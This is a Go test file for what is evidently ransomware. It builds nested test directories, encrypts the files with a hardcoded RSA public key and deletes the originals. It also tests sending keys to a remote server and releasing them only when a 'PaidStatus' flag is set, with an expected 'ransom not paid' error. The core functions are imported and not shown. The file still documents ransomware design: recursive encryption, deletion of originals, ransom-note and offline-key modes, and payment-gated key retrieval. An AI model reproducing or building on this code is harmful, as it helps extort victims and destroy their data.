package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"main/src/cli"
	wcc_crypto "main/src/crypto"
	"main/src/utils"
	"os"
	"path"
	"testing"
)

func createRecursiveFileHierarchy(t *testing.T) ([]string, string) {
	testDir := t.TempDir()
	cli.Settings.EncryptedFileExt = "kc"
	cli.Settings.LeaveNote = false
	cli.Settings.RawKey = true
	fileName := testDir + "/_testFile"
	testString := "This is a test string"
	c := 3
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	recursiveDir1 := testDir + "/testRecursion1"
	recursiveDir2 := testDir + "/testRecursion2"
	recursiveDir3 := testDir + "/wow/this/is/sooo/deep"
	recursiveDir4 := testDir + "/wow/this"
	os.MkdirAll(recursiveDir1, 0777)
	os.MkdirAll(recursiveDir2, 0777)
	os.MkdirAll(recursiveDir3, 0777)
	os.MkdirAll(recursiveDir4, 0777)
	fileName = path.Join(recursiveDir1, "recursive_1_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}
	fileName = path.Join(recursiveDir2, "recursive_2_")
	for i := 0; i < c; i++ {
		fullFileName := fileName + fmt.Sprint(i) + ".txt"
		ioutil.WriteFile(fullFileName, []byte(testString), 0777)
		if _, err := os.Stat(fullFileName); err != nil {
			t.Error("file not created correctly")
		}
	}

	fileName = path.Join(recursiveDir3, "recursive_3_")
	fullFileName := fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	fileName = path.Join(recursiveDir4, "recursive_4_")
	fullFileName = fileName + fmt.Sprint(1) + ".txt"
	ioutil.WriteFile(fullFileName, []byte(testString), 0777)
	if _, err := os.Stat(fullFileName); err != nil {
		t.Error("file not created correctly")
	}

	return wcc_crypto.GetFilesInCurrentDir("txt", testDir, true), testDir
}

var key string = `2D2D2D2D2D424547494E205055424C4943204B45592D2D2D2D2D0D0A4D494943496A414E42676B71686B6947397730424151454641414F43416738414D49494343674B43416745413130687A566B76725573565A6A426E45594C64770D0A4B58694943506F3642306D62564A47686B4458435A644E4779766A7A3032394169694D6E31516D7056777A55783773316E314C582B78537245736B594A34596A0D0A6533526836556F48304855546E3765544B534A2F7A344A334C6A776558533372314352616F6972564C77666857544A663149372B636C6B6479567749367063570D0A6C6D5830522B674D445553574E67667349706D464475487936523863756D654B695144524247774532795677715157432F5455477042677A574A5843797279330D0A6F5A77435431653652385679346948553153527A573863776C7370476E6A6E38686855562B7071367273434854746D4274626D6A5167383549416F67694F52550D0A4E356F564F754A51774B496564776378366E7861535833416F6E466B4951346A6C385A362F5A53502B62677332614674476E4F523062486C63342B38625A57320D0A324769424750744C4D79476B7165496B57505248344D57646C6D6F4C6671386A55313534707A65634A6F6E336D2B37386253787A6F6D6A496E47315A643565500D0A7A7879777650577175634556657431526637755649712F6B376A5748484E35626457476B6658523050786E6963674363332F6D703879476D6E684977325142340D0A47334E4830323373543858445077455A66524137365536444F466E2F3075413976665143523678423353476757714832796A7373486731574B5463744470746B0D0A4A71344F525270637445362F73652B396E78687A3178536D745070396377444666767A725063714A63634A466630343756754C507A4B342B636756386A67366B0D0A636C326D397275794D2F43764A30355A6E337055655A766A7930377A4C7834754A5549774B594962677467632F704C325453356E432F6151686856636D666E480D0A6954384A4A476F57585453413144626B47496166504B38434177454141513D3D0D0A2D2D2D2D2D454E44205055424C4943204B45592D2D2D2D2D`

func tearDown() {
	os.Remove("./e_key.txt")
	os.Remove("./raw_key.bin")
	os.Remove("./decryption_hash.bin")
	os.Remove("./d_key.txt")
}

func TestEncryptionDecryptionScheme(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	StartEncryption(&dQue, key)
	for _, f := range files {
		// ff := filepath.Join(rootDir, f)
		err := os.Remove(f)
		if err != nil {
			log.Fatal("Failed to delete the file")
			t.Error(err)
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletion(t *testing.T) {
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	cli.Settings.Delete = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestEncryptionDecryptionSchemeWithDeletionSendOff(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	files, rootDir := createRecursiveFileHierarchy(t)
	var dQue utils.Queue
	// keey := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
	dQue.Init(files)
	cli.Settings.Delete = true
	cli.Settings.RawKey = false
	cli.Settings.PaidStatus = true
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}

func TestSendoffAndReceiveKey(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	keyHex, err := utils.RetriveKeyByHash(hash, false)
	if err != nil {
		t.Error(err.Error())
	}
	assertionValue, _ := hex.DecodeString(keyHex)
	if string(assertionValue) != testString {
		t.Error("Test string missmatch")
	}
}

func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
	if !utils.CheckIfServerIsOnline() {
		t.Skip("Server is unreachable or broken")
	}
	const testString string = "Not paid test String!"
	var hash string = wcc_crypto.GetHash([]byte(testString))
	pubKeyBytes, _ := hex.DecodeString(key)
	pubKey := string(pubKeyBytes)
	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
	if err != nil {
		t.Error(err.Error())
	}
	if !success {
		t.Error("Sendoff failed!")
	}
	// retrieve key
	_, err = utils.RetriveKeyByHash(hash, false)
	if err != nil {
		if err.Error() != "ransom not paid" {
			t.Error("Unexpected error")
		}
	} else {
		t.Error("Error expected")
	}
}

func TestOfflineDecryption(t *testing.T) {
	var dQue utils.Queue
	files, rootDir := createRecursiveFileHierarchy(t)
	dQue.Init(files)
	cli.Settings.Delete = true
	cli.Settings.RawKey = false
	cli.Settings.PaidStatus = true
	cli.Settings.OfflineMode = true
	clientPrivateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}
	cli.Settings.SuppliedClientPrivateKey = clientPrivateKey
	privateKeyBytes := x509.MarshalPKCS1PrivateKey(clientPrivateKey)
	StartEncryption(&dQue, key)
	for _, f := range files {
		_, b := os.Stat(f)
		if b == nil {
			t.Errorf("Filed should be deleted")
		}
	}
	var eQue utils.Queue
	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
	eQue.Init(eFiles)
	// prepare decrypted key
	ioutil.WriteFile("./d_key.txt", privateKeyBytes, 0777)
	StartDecryption(&eQue, key)
	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
	for _, ff := range files {
		if (utils.FindStringIndex(finalFiles, ff)) == -1 {
			t.Error("Final array mismatch")
		}
		content, err := ioutil.ReadFile(ff)
		if err != nil {
			log.Fatal("Failed to read decrypted file")
		}
		if string(content) != "This is a test string" {
			t.Error("Decrypted content mismatch")
		}
	}
	tearDown()
}
